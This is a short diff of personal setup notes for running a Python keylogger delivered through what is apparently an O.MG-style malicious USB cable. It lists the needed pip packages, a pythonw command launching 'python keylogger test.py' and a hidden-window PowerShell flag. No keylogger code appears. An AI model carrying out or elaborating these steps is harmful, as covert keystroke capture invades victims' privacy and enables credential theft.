@@ -1,11 +1,17 @@
 Notes
 
 #### install via cable
+
 #pip install pynput
+
 #pip install pywin32
+
 #pip install requests
+
 #pip install easygui
+
 #run powershell >  pythonw "C:\Users\mrgig\Desktop\OMG CABLE STUFF\python keylogger test.py"
+
 #powershell -WindowStyle Hidden
 
 # --------------Install python via powershell---------------
